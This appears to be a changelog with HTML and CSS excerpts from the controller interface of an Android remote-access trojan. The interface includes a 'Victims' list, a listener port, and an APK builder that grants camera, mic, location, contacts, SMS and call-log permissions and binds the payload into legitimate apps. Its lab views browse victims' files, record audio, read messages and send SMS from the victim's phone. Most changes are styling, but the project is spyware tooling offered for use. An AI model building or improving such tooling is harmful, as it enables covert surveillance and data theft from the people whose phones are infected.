...
- Polishes off Main HTML and Lab HTML files to give them a nice clean look
- Dark theme feature Implementation (HTML side)
- Separate External & Removable Storage Tabs
- Separate Inbox and Outbox SMS message Tabs
...
<body ng-controller="AppCtrl" class="draggable dark">
    <div class="ui top attached tabular menu border-bottom">
        <a class="item active notDraggable border" data-tab="first"><i
                class="large eye icon"></i>Victims</a>
        <a class="item notDraggable border" data-tab="second"><i
                class="large green android icon"></i>APK
            Builder</a>
        <div class="ui right mini text menu notDraggable">
            <button id="toggle-dark-mode" class="ui circular toggle button"
                style="font-size: 6px; height: 17px" ng-click="switch()"></button>
                        ...
                        <div class="ui bg center aligned segment">
                            <div style="line-height: 70px">
                                <div class="ui right floated labeled input">
                                    ...
                                    <input type="text" ng-model="port" class="bg2"
                                        placeholder="Default is 42474">
                                </div>
                                <button ng-click="clearLogs(); Listen(port)"
                                    class="ui labeled icon black button"><i
                                        class="terminal icon"></i>Listen</button>
                                <button ng-click="clearLogs(); StopListening(port)"
                                    class="ui labeled icon black button"><i
                                        class="terminal icon"></i>Stop</button>
                            </div>
                        </div>
                    </div>
                </div>
                    ...
                    <table class="ui table bg single line selectable">
                        ...
                        <tbody>
                            <tr ng-repeat="(key, victim) in victims">
                                <td><a class="ui black ribbon label" ng-click="openLab(key)">Open The
                                        Lab</a></td>
                                <td ng-if="victim.country != null"><i
                                        class="{{victim.country}} flag"></i>
                                </td>
    ...
    <div class="ui bottom attached black message notDraggable" id="log">
        <div ng-repeat="log in logs" class="log">
            ...
            <div class="w65 " style="display: inline-block" ng-style="{'color':log.color}"
                ng-bind="log.msg"></div>
        </div>
    </div>
</body>
...
<div class="ui segment h100 bg border">
    ...
    <table class="ui very compact table bg">
        ...
        <tbody>
            <tr class="center aligned">
                ...
                <td>
                    <div class="ui labeled fluid input ">
                        <input ng-model="srcPort" class="bg2" type="number" min="1025" max="65535"
                            placeholder="default is 42474">
                        <div class="ui black label">
                            Server Port
                        </div>
            ...
            <tr class="center aligned bg">
                <td>
                    <div class="ui checkbox">
                        <input type="checkbox" id="Permissions1" value="CameraPer" checked>
                        <label>Camera</label>
                    </div>
                </td>
                <td>
                    <div class="ui checkbox">
                        <input type="checkbox" id="Permissions2" value="StoragePer" checked>
                        <label>Storage</label>
                    </div>
                </td>
                <td>
                    <div class="ui checkbox">
                        <input type="checkbox" id="Permissions3" value="MicPer" checked>
                        <label>Mic</label>
                    </div>
                </td>
                <td>
                    <div class="ui checkbox">
                        <input type="checkbox" id="Permissions4" value="LocationPer" checked>
                        <label>Location</label>
                    </div>
                </td>
                <td>
                    <div class="ui checkbox">
                        <input type="checkbox" id="Permissions5" value="ContactsPer" checked>
                        <label>Contacts</label>
                    </div>
                </td>
                <td>
                    <div class="ui checkbox">
                        <input type="checkbox" id="Permissions6" value="SMSPer" checked>
                        <label>SMS</label>
                    </div>
                </td>
                <td>
                    <div class="ui checkbox">
                        <input type="checkbox" id="Permissions7" value="CallsLogsPer" checked>
    ...
    <table class="ui very compact table bg">
            ...
            <tr class="center aligned">
                <td>
                    <div class="ui radio checkbox">
                        <input type="radio" name="method" checked="checked" ng-model="bindApk.method"
                            value="BOOT">
                ...
                <td>
                    <button ng-click="clearLogs(); BrowseApk()" ng-disabled="!bindApk.enable"
                        class="ui black labeled icon button "><i class="android icon"></i>Browse
                        Apk</button>
                </td>
                <td>
                    <div class="ui radio checkbox">
        ...
        <tfoot class="half-width">
            <tr class="center aligned">
                <th colspan="3">
                    <button ng-click="clearLogs(); Build(srcIP,srcPort)" ng-hide="bindApk.enable"
                        ng-show="Build" class="ui labeled icon red button"><i
                            class="hammer icon"></i>Build</button>
                    <button ng-click="clearLogs(); Build(srcIP,srcPort)" ng-hide="Build"
                        ng-show=bindApk.enable class="ui labeled icon green button"><i
                            class="screwdriver icon"></i>Bind</button>
                </th>
            </tr>
        </tfoot>
    </table>
...
<body ng-controller="LabCtrl" class="draggable dark bg">
    <div class="ui grid h80 bg">
        ...
        <div class="row centered h75 notDraggable">
            <div class="sixteen wide column">
                <div class="ui segment full bg border" style="height: 375px">
...
```html
<p class="bg"
    style="vertical-align: middle; color:black;font-size:200%; text-align: center;margin:0;top:50%;left: 50%;transform: translate(-50%, -50%);;position: absolute">
    "Stay Educated"</p>
```
...
<div class="ui top attached tabular menu border-bottom">
    <a class="item active border" data-tab="external"
        ng-click="clearLogs(); requestExternalStoragePath()">External Storage</a>
    <a class="item border" data-tab="sdcard" ng-click="clearLogs(); requestSdCardPath()">Removable
        Storage</a>
</div>

<!-- Tab Content for External Storage -->
<div class="ui bottom attached tab segment active border" data-tab="external">
    <div class="ui segment {{load}} full"
        style="overflow-y:auto;overflow-x: auto;white-space:nowrap; height: 275px;" id="externalParent">
        <div class="ui list" style="overflow-y:auto;white-space:nowrap;"
            infinite-scroll="increaseLimit()" infinite-scroll-container='"#externalParent"'>
...
<!-- Tab Content for Removable Storage -->
<div class="ui bottom attached tab segment border" data-tab="sdcard">
    <div class="ui segment {{load}} full"
        style="overflow-y:auto;overflow-x: auto;white-space:nowrap; height: 275px;"
        id="removableParent">
        <div class="ui list" style="overflow-y:auto;white-space:nowrap;"
            infinite-scroll="increaseLimit()" infinite-scroll-container='"#removableParent"'>
            <div class="item" ng-repeat="file in files | limitTo:barLimit | orderBy:['-isDir','name']">
                <a ng-click="clearLogs(); getFiles(file.path)" ng-if="file.isDir">
                    <i class="folder icon"></i> {{file.name}}
                </a>
...
<div class="ui segment h100">
    <div class="ui grid center aligned h100 border" style="height: 345px;">
        <div class="row h30">
            <div class="column">
                <div class="ui right floated labeled input">
                    <div class="ui black label">
                ...
                <button class="ui labeled icon black button" ng-click="clearLogs(); Record(sec)"><i
                        class="photo icon"></i>Record</button>
            </div>
        </div>
        <div class="row  h70">
            <div class="column h100">
                <div class="ui segment">
                    ...
                    <br>
                    <br>
                    <button class="ui red button" ng-click="clearLogs(); SaveAudio()"
                        ng-disabled="isAudio"><i class="save icon"></i>Save</button>
                </div>
            </div>
        </div>
    </div>
...
<div class="ui segment h100 {{load}}">
    <div class="ui grid center aligned h100">
        <div class="row h20">
            <div class="column">
                <button class="ui labeled icon black button" ng-click="clearLogs(); Refresh()"><i
                        class="refresh icon"></i>Refresh</button>
            </div>
        </div>

        <div class="row h80">
            <div class="column h100" style="height: 250px;">
...
* contacts.html
```html
<div class="ui {{load}} segment h100 bg border" style="overflow: scroll; height: 345px !important;"
    id="parent">
...
```html
<div class="ui top attached tabular menu border-bottom">
    <a class="item active border" data-tab="sendSms">Send SMS</a>
    <a class="item border" data-tab="smsLists"
        ng-click="clearLogs(); activateDefaultTabSmsLists(); getInboxSMSList()">SMS Lists</a>
</div>

<!-- "Send SMS" Tab for sending text messages from the Victim Device -->
<div class="ui bottom attached tab segment active h90 center aligned border" style="height: 304px;"
    data-tab="sendSms">
    <br>
    ...
    <br>
    <br>
    <button class="ui labeled icon red button" ng-click="clearLogs(); SendSMS(phoneNo,msg);"> <i
            class="send outline icon"></i>SEND</button>
</div>

<!-- "SMS Lists" Tab containing nested Inbox and Outbox Tabs -->
<div class="ui bottom attached tab segment h90 border" data-tab="smsLists" style="height: 304px">
    <div class="ui top attached tabular menu border-bottom">
        <a class="item active border" data-tab="inboxSMSList"
            ng-click="clearLogs(); getInboxSMSList()">Inbox List</a>
        <a class="item border" data-tab="sentSMSList" ng-click="clearLogs(); getSentSMSList()">Outbox
            List</a>
    </div>

    <!-- "Inbox List" Tab for viewing a list of Text Messages the Victim Device has received -->
    <div class="ui bottom attached tab {{inboxLoading}} segment h90 border" data-tab="inboxSMSList"
        id="inboxParent">
    ...
    <div class="ui bottom attached tab {{sentLoading}} segment bg border" data-tab="sentSMSList"
        id="sentParent">
        <table class="ui very compact striped table bg">
            <thead>
                <tr>
...
* callsLogs.html
```html
<div class="ui {{load}} segment h100 bg border" style="overflow: scroll; height: 345px;" id="parent">
...
- Certain Heigh and width corrections for the Camera HTML
- Reactors CSS for better readability
- Separates general utility classes for better readability
- Adds extra height and width CSS for Main utility classes as well as separates them for better readability
- Separates Lab Utility Classes for better readability
<br>
...
.border { border: 1px solid black; }  /* Adds a black border around elements */
.highlight { background-color: #9E9E9E; }  /* Highlights elements with a grey background */

body, html { padding: 0px 10px; }  /* Adds 10px padding on the left and right */
.nopadding { padding: 0px; }  /* Removes padding entirely */
.log { font-size: 12px; font-family: Courier New, Courier, monospace; }  /* Styling for logs: Small font size for logs, Monospace font for logs */

/* Draggable and non-draggable regions for Electron apps */
.draggable { -webkit-app-region: drag; }  /* Allows this element to be dragged */
.notDraggable { -webkit-app-region: no-drag; }  /* Prevents this element from being dragged */

::-webkit-scrollbar { display: none; }/* Custom scrollbar styling (hidden) */
/* -------------------------------------------------------------------------------------------*/

/*---------------------Main Utilities---------------------*/
/* Full container classes for height and width */
.full {
...
.h5   { height: 5%;   }  /* 5% height of the parent */
.h10  { height: 10%;  }  /* 10% height of the parent */
.h15  { height: 15%;  }  /* 15% height of the parent */
.h20  { height: 20%;  }  /* 20% height of the parent */
.h25  { height: 25%;  }  /* 25% height of the parent */
.h30  { height: 30%;  }  /* 30% height of the parent */
.h35  { height: 35%;  }  /* 35% height of the parent */
.h40  { height: 40%;  }  /* 40% height of the parent */
.h45  { height: 45%;  }  /* 45% height of the parent */
.h50  { height: 50%;  }  /* 50% height of the parent */
.h55  { height: 55%;  }  /* 55% height of the parent */
.h60  { height: 60%;  }  /* 60% height of the parent */
.h65  { height: 65%;  }  /* 65% height of the parent */
.h70  { height: 70%;  }  /* 70% height of the parent */
.h75  { height: 75%;  }  /* 75% height of the parent */
.h80  { height: 80%;  }  /* 80% height of the parent */
.h85  { height: 85%;  }  /* 85% height of the parent */
.h90  { height: 90%;  }  /* 90% height of the parent */
.h95  { height: 95%;  }  /* 95% height of the parent */
.h100 { height: 100%; }  /* Full height of the parent */

/* Width utility classes */
.w5   { width: 5%;   }  /* 5% width of the parent */
.w10  { width: 10%;  }  /* 10% width of the parent */
.w15  { width: 15%;  }  /* 15% width of the parent */
.w20  { width: 20%;  }  /* 20% width of the parent */
.w25  { width: 25%;  }  /* 25% width of the parent */
.w30  { width: 30%;  }  /* 30% width of the parent */
.w35  { width: 35%;  }  /* 35% width of the parent */
.w40  { width: 40%;  }  /* 40% width of the parent */
.w45  { width: 45%;  }  /* 45% width of the parent */
.w50  { width: 50%;  }  /* 50% width of the parent */
.w55  { width: 55%;  }  /* 55% width of the parent */
.w60  { width: 60%;  }  /* 60% width of the parent */
.w65  { width: 65%;  }  /* 65% width of the parent */
.w70  { width: 70%;  }  /* 70% width of the parent */
.w75  { width: 75%;  }  /* 75% width of the parent */
.w80  { width: 80%;  }  /* 80% width of the parent */
.w85  { width: 85%;  }  /* 85% width of the parent */
.w90  { width: 90%;  }  /* 90% width of the parent */
.w95  { width: 95%;  }  /* 95% width of the parent */
.w100 { width: 100%; }  /* Full width of the parent */
/*--------------------------------------------------------*/

/*---------------------Lab Utilities---------------------*/

/** Camera Utilities **/
/* Adjusts the border height for `ui grid center aligned` element */
.ui.grid.center.aligned.border {
  max-height: 110%;
  height: 108%;
  border-radius: 4px
}
/* Ensures the border for the nested `ui image` element scales correctly */
.ui.image.border {
  position: relative;
  width: 100%; 
  height: 100%;
...
/* Adjusts the border of the `image-container` and `imageHolder` element to fill their container */
.ui.image.border .image-container { 
  width: 100%;
  height: 100%;
  object-fit: cover;
  display: flex;
...
/** SMS Manager Utilities **/
#inboxParent, #sentParent {
  overflow-y: auto;
  height: 234px!important; /* Ensures consistent height */
  min-height: 234px; /* Prevents shrinkage during reflow */
  max-height: 234px; /* Limits the height to prevent overflow */
}
/*-------------------------------------------------------*/
...
@media (prefers-color-scheme: dark) {
  ...
  .dark .black{ background-color: #2f2f49!important; }
  .dark #log{ background-color: #181825!important; }
  ...
  .dark .table td{ color: var(--foreground)!important; }
  .dark .table{ border: 1px var(--border) solid!important; }
  .dark .checkbox label{ color: var(--foreground)!important }
  .dark .label{ color: var(--foreground)!important; }
  
  .border{ border: 1px var(--border) solid!important; }
  .border-bottom{ border-bottom: none!important; }
  
  .bg{ background-color: var(--background)!important; color: var(--foreground)!important; }
  .bg1{ background-color: var(--background-1)!important; color: var(--foreground)!important; }
  .bg2{ background-color: var(--background-2)!important; }
  .bg2::placeholder{ color: #11111b!important; }
}
...
#toggle-dark-mode.active { background-color: #0015ff; /* Color when active */ }
#toggle-dark-mode.active::before { transform: translateX(20px) translateY(-50%); /* Moves knob to the right and keeps it centered */ }
...
body.dark-mode #toggle-dark-mode { background-color: #333; /* Track color in dark mode */ }
body.dark-mode #toggle-dark-mode.active { background-color: #0015ff; /* Active track color in dark mode */ }
/* -----------------------------------------------------------*/
```
</details>
<br>
...
- Updated File Manager Feature (Server Side - JS)
...
exports.IOSocketPath = 'smali' + path.sep + 'a.1' + path.sep + 'f.smali';
